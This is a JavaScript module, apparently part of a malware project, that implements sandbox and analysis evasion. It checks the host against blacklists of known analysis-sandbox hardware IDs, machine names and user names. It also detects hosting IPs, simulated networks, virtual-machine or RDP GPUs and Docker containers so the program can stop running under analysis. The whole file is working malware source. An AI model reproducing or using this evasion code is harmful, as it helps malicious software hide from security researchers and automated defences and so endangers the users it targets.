const { userInfo } = require("node:os");
const PCInfo = require("./PCInfo");
const Util = require("./Util");
const config = require("../config/config");
const isInsideContainer = require("./data/is-inside-container");

const HWID_BLACKLIST = [
  "7AB5C494-39F5-4941-9163-47F54D6D5016",
  "032E02B4-0499-05C3-0806-3C0700080009",
  "03DE0294-0480-05DE-1A06-350700080009",
  "11111111-2222-3333-4444-555555555555",
  "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
  "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
  "4C4C4544-0050-3710-8058-CAC04F59344A",
  "00000000-0000-0000-0000-AC1F6BD04972",
  "00000000-0000-0000-0000-000000000000",
  "5BD24D56-789F-8468-7CDC-CAA7222CC121",
  "49434D53-0200-9065-2500-65902500E439",
  "49434D53-0200-9036-2500-36902500F022",
  "777D84B3-88D1-451C-93E4-D235177420A7",
  "49434D53-0200-9036-2500-369025000C65",
  "B1112042-52E8-E25B-3655-6A4F54155DBF",
  "00000000-0000-0000-0000-AC1F6BD048FE",
  "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
  "A15A930C-8251-9645-AF63-E45AD728C20C",
  "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
  "C7D23342-A5D4-68A1-59AC-CF40F735B363",
  "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
  "44B94D56-65AB-DC02-86A0-98143A7423BF",
  "6608003F-ECE4-494E-B07E-1C4615D1D93C",
  "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
  "49434D53-0200-9036-2500-369025003AF0",
  "8B4E8278-525C-7343-B825-280AEBCD3BCB",
  "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
  "79AF5279-16CF-4094-9758-F88A616D81B4",
  "FE822042-A70C-D08B-F1D1-C207055A488F",
  "76122042-C286-FA81-F0A8-514CC507B250",
  "481E2042-A1AF-D390-CE06-A8F783B1E76A",
  "F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C",
  "9961A120-E691-4FFE-B67B-F0E4115D5919"
];

const PCNAME_BLACKLIST = [
  "bee7370c-8c0c-4",
  "desktop-nakffmt",
  "win-5e07cos9alr",
  "b30f0242-1c6a-4",
  "desktop-vrsqlag",
  "q9iatrkprh",
  "xc64zb",
  "desktop-d019gdm",
  "desktop-wi8clet",
  "server1",
  "lisa-pc",
  "john-pc",
  "desktop-b0t93d6",
  "desktop-1pykp29",
  "desktop-1y2433r",
  "wileypc",
  "work",
  "6c4e733f-c2d9-4",
  "ralphs-pc",
  "desktop-wg3myjs",
  "desktop-7xc6gez",
  "desktop-5ov9s0o",
  "qarzhrdbpj",
  "oreleepc",
  "archibaldpc",
  "julia-pc",
  "d1bnjkfvlh",
  "compname_5076",
  "desktop-vkeons4",
  "NTT-EFF-2W11WSS"
];

const PCUSER_BLACKLIST = [
  "wdagutilityaccount",
  "abby",
  "peter wilson",
  "hmarc",
  "patex",
  "john-pc",
  "rdhj0cnfevzx",
  "keecfmwgj",
  "frank",
  "8nl0colnq5bq",
  "lisa",
  "john",
  "george",
  "pxmduopvyx",
  "8vizsm",
  "w0fjuovmccp5a",
  "lmvwjj9b",
  "pqonjhvwexss",
  "3u2v9m8",
  "julia",
  "heuerzl",
  "harry johnson",
  "j.seance",
  "a.monaldo",
  "tvm"
];

const RDP_GPU_ADAPTER = "microsoft remote display adapter";

const VM_GPU_ADAPTERS = ["virtualbox", "vmware"];

class VmProtect {
  static checkHWID() {
    const hwid = PCInfo.hwid;
    return HWID_BLACKLIST.includes(hwid);
  }

  static checkName() {
    const name = process.env.COMPUTERNAME?.toLowerCase();
    return PCNAME_BLACKLIST.includes(name);
  }

  static checkUser() {
    const user = userInfo().username?.toLowerCase();
    return PCUSER_BLACKLIST.includes(user);
  }

  static async checkHost() {
    const res = await fetch("http://ip-api.com/line/?fields=hosting").catch(
      (e) => Util.report(e, null)
    );

    if (!res) return false;

    const text = await res.text().catch((e) => Util.report(e, null));

    if (typeof text === "string" && text.trim() === "true") return true;

    return false;
  }

  static async checkHTTPSimulation() {
    try {
      const url = `https://nicetry-${(Math.random() + 1)
        .toString(36)
        .substring(7)}.com`;

      const res = await fetch(url);

      return res.ok();
    } catch {
      return false;
    }
  }

  static async checkGPU() {
    const cmd = await Util.exec("wmic path win32_VideoController get name");

    for (const adapter of cmd.trim()?.split("\n")?.slice(1)) {
      if (typeof adapter != "string") return false;

      const lower = adapter.trim().toLowerCase();

      if (lower === RDP_GPU_ADAPTER) return "rdp";

      if (VM_GPU_ADAPTERS.includes(lower)) return "vm";
    }

    return false;
  }

  static async check() {
    if (
      config.blockVm &&
      (VmProtect.checkHWID() || VmProtect.checkName() || VmProtect.checkUser())
    )
      return true;

    if (config.blockHost && (await VmProtect.checkHost())) return true;

    if (config.blockHttpSimulation && (await VmProtect.checkHTTPSimulation()))
      return true;

    const gpu = await VmProtect.checkGPU().catch((e) => Util.report(e, false));

    if (gpu === "vm" && config.blockVm) return true;

    if (gpu === "rdp" && config.blockRdp) return true;

    if (config.blockDocker && isInsideContainer()) return true;

    return false;
  }
}

module.exports = VmProtect;
